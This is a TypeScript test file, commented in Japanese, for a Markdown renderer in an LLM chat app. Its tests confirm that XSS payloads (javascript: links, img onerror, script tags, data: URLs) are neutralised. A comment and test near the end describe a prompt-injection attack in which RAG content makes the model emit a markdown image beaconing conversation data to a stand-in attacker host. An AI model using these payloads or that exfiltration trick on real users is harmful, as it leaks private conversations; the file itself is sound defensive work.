import { describe, it, expect } from "vitest";
import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import Markdown from "../src/components/Markdown.js";
import { safeUrl } from "../src/lib/safe-url.js";

/**
 * 実コンポーネントを HTML 文字列に描画して確かめる。
 * jsdom を足さずに「本当に描画されるもの」を検証できる (テスト用の別実装を作らない)。
 */
const render = (markdown: string) => renderToStaticMarkup(createElement(Markdown, null, markdown));

describe("safeUrl", () => {
  // 回答は LLM 由来 = 実質的に信頼できない入力で、RAG 経由で外部サイトのテキストも混ざる。
  // リンクの scheme は許可制にする。
  it("http / https / mailto は通す", () => {
    expect(safeUrl("https://dm.takaratomy.co.jp/")).toBe("https://dm.takaratomy.co.jp/");
    expect(safeUrl("http://example.test/a")).toBe("http://example.test/a");
    expect(safeUrl("mailto:a@example.test")).toBe("mailto:a@example.test");
  });

  it("相対リンクは通す", () => {
    expect(safeUrl("/rule")).toBe("/rule");
    expect(safeUrl("#section")).toBe("#section");
    expect(safeUrl("./a/b")).toBe("./a/b");
  });

  it("javascript: を弾く", () => {
    expect(safeUrl("javascript:alert(1)")).toBe("");
    expect(safeUrl("JavaScript:alert(1)")).toBe(""); // 大文字小文字を問わない
    expect(safeUrl("  javascript:alert(1)")).toBe(""); // 前後の空白で誤魔化せない
  });

  it("制御文字を挟んだ javascript: も弾く", () => {
    // "java\tscript:" や "java\nscript:" はブラウザが scheme として解釈することがある。
    expect(safeUrl("java\tscript:alert(1)")).toBe("");
    expect(safeUrl("java\nscript:alert(1)")).toBe("");
    expect(safeUrl("java\0script:alert(1)")).toBe("");
  });

  it("data: と vbscript: も弾く", () => {
    expect(safeUrl("data:text/html;base64,PHNjcmlwdD4=")).toBe("");
    expect(safeUrl("vbscript:msgbox(1)")).toBe("");
  });
});

describe("Markdown", () => {
  it("強調・箇条書き・見出しを描画する", () => {
    const html = render("## 結論\n\n**S・トリガー**は任意です。\n\n- 使う\n- 使わない");
    expect(html).toContain("結論");
    // 要素にクラスを当てているので、タグ名と中身で見る (完全一致で書くとスタイル変更で落ちる)。
    expect(html).toMatch(/<strong[^>]*>S・トリガー<\/strong>/);
    expect(html).toMatch(/<li[^>]*>/);
  });

  it("表を描画する (remark-gfm)", () => {
    const html = render("| 条文 | 内容 |\n| --- | --- |\n| 113.6 | 任意 |");
    expect(html).toContain("<table");
    expect(html).toContain("113.6");
  });

  it("生 HTML を描画しない (XSS)", () => {
    // 回答は LLM 由来。rehype-raw も dangerouslySetInnerHTML も使わないので、
    // HTML は素通りせず**テキストとしてエスケープ**される。ここが崩れると即 XSS。
    const html = render('<img src=x onerror="alert(1)">ふつうの文');

    expect(html).not.toContain("<img"); // 本物の img 要素になっていない
    expect(html).not.toMatch(/<[^>]+\bonerror=/i); // どの要素にも onerror 属性が付いていない
    expect(html).toContain("&lt;img"); // エスケープされてテキストになっている
    expect(html).toContain("ふつうの文");
  });

  it("script タグを描画しない", () => {
    const html = render("<script>alert(1)</script>");
    expect(html).not.toContain("<script");
    expect(html).toContain("&lt;script"); // テキストとして出る
  });

  it("javascript: リンクを描画しない", () => {
    const html = render("[クリック](javascript:alert(1))");
    expect(html).not.toContain("javascript:");
  });

  it("外部リンクには noopener noreferrer を付ける", () => {
    const html = render("[公式](https://dm.takaratomy.co.jp/)");
    expect(html).toContain('rel="noopener noreferrer"');
    expect(html).toContain('target="_blank"');
  });

  it("ページ内リンク (脚注など) は別タブで開かない", () => {
    // remark-gfm の脚注は `#user-content-fn-1` を出す。これに target="_blank" が付くと
    // 脚注を踏むたびに新しいタブが開く。
    const html = render("本文[^1]\n\n[^1]: 注釈");
    expect(html).toMatch(/<a href="#user-content-fn-1"(?![^>]*target=)/);
  });

  // --- 画像 ---------------------------------------------------------------
  //
  // **LLM が書いた画像は一切読み込まない。** これは LLM チャット UI の既知の攻撃で、
  // 描画しただけで (クリック不要で) ブラウザが任意の外部 URL を取得しにいく。
  //
  // RAG は外部サイト (公式サイト・ブログ) から本文を取り込む。そこに仕込まれた
  // プロンプトインジェクションが `![](https://evil/?q=会話の内容)` を出力させると、
  // **会話内容が攻撃者のサーバへ流出する**。IP/UA の漏洩やトラッキングにも使える。
  //
  // このアプリに LLM が書いた画像を表示する正当な理由は無い
  // (カード画像は自前 DB から別経路で出している)。

  it("外部画像を読み込まない (プロンプトインジェクションによる情報漏洩の遮断)", () => {
    const html = render("![盤面](https://evil.test/beacon.png?q=secret)");
    expect(html).not.toContain("<img");
    expect(html).not.toContain("evil.test");
    // preload も出させない (Next が <link rel=preload as=image> を注入してしまう)
    expect(html).not.toContain("preload");
  });

  it("画像の代替テキストは残す (情報を黙って捨てない)", () => {
    const html = render("![カードの画像](https://evil.test/x.png)");
    expect(html).toContain("カードの画像");
  });

  it("javascript: / data: の画像も当然出さない", () => {
    expect(render("![x](javascript:alert(1))")).not.toContain("<img");
    expect(render("![x](data:image/svg+xml;base64,PHN2Zz4=)")).not.toContain("<img");
  });

  it("ストリーミング中の未閉じマークアップでも落ちない", () => {
    // token は1文字ずつ届くので、`**` が片方しか来ていない状態が必ず発生する。
    expect(() => render("**途中まで")).not.toThrow();
    expect(() => render("```ts\nconst a =")).not.toThrow();
    expect(() => render("| 条文 |\n| ---")).not.toThrow();
    expect(() => render("[未閉じリンク](http")).not.toThrow();
  });

  it("改行を <br> にする (LLM は段落を空行で区切らないことがある)", () => {
    // Markdown の既定では単一改行は無視される。回答が1行に潰れて読めなくなるので、
    // remark-gfm と合わせて改行を活かす。
    const html = render("1行目\n2行目");
    expect(html).toContain("<br");
  });

  it("空文字でも落ちない", () => {
    expect(() => render("")).not.toThrow();
  });
});
